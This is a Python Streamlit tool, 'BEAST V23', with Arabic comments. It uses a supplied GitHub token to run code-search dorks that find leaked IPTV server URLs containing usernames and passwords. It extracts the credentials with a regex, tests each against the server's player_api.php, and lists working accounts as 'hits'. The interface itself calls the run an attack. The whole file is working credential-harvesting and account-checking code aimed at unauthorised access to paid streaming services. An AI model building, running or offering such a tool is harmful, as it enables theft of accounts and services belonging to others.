import streamlit as st
import requests
import re
import time
from datetime import datetime

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V23 LIVE", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - LIVE FEED</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان كما طلبت (واضح وصريح)
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit { 
        background: #0d1117; border: 1px solid #00ff41; 
        padding: 10px; border-radius: 5px; margin-bottom: 5px;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# الجانب الجانبي
with st.sidebar:
    st.title("⚡ BEAST V23")
    token = st.text_input("GitHub Token:", type="password")
    start = st.button("🚀 ابدأ الهجوم المباشر")
    st.info("النتائج ستظهر تحت بعضها فوراً أثناء الفحص")

# مناطق العرض الحية
st.subheader("📡 الرادار المباشر (الفحص الحالي)")
radar_area = st.empty() # هنا تظهر السيرفرات اللي بتفحص حالياً

st.subheader("🏆 النتائج الشغالة (Hits)")
hits_area = st.container() # هنا تنزل السيرفرات الشغالة تحت بعضها

# المحرك الرئيسي
if start and token:
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    dorks = ['extension:txt "get.php?username=" "password="', 'extension:m3u "player_api.php"']
    
    # قائمة لتخزين النتائج في الجلسة الحالية فقط للعرض السريع
    found_count = 0
    
    for dork in dorks:
        for page in range(1, 50):
            try:
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=50"
                res = requests.get(search_url, headers=headers).json()
                
                if "items" not in res:
                    radar_area.warning("Rate Limit! Waiting...")
                    time.sleep(10)
                    continue

                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = requests.get(raw_url, timeout=3).text
                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for m in matches:
                        host, user, pw = m[0], m[1], m[2]
                        
                        # عرض السيرفر اللي بيتفحص "الآن" ديركت
                        radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host} | {user}</p>", unsafe_allow_html=True)
                        
                        try:
                            # فحص السيرفر
                            check_url = f"{host}/player_api.php?username={user}&password={pw}"
                            r = requests.get(check_url, timeout=2).json()
                            
                            if r.get("user_info", {}).get("status") == "Active":
                                found_count += 1
                                # إضافة النتيجة "تحت بعضها" في الصفحة فوراً
                                with hits_area:
                                    st.markdown(f"""
                                    <div class="active-hit">
                                        <span class="text-green">✅ HIT #{found_count}</span><br>
                                        <span class="text-white">HOST: {host}</span><br>
                                        <span class="text-yellow">USER: {user} | PASS: {pw}</span>
                                    </div>
                                    """, unsafe_allow_html=True)
                        except:
                            continue
            except:
                continue
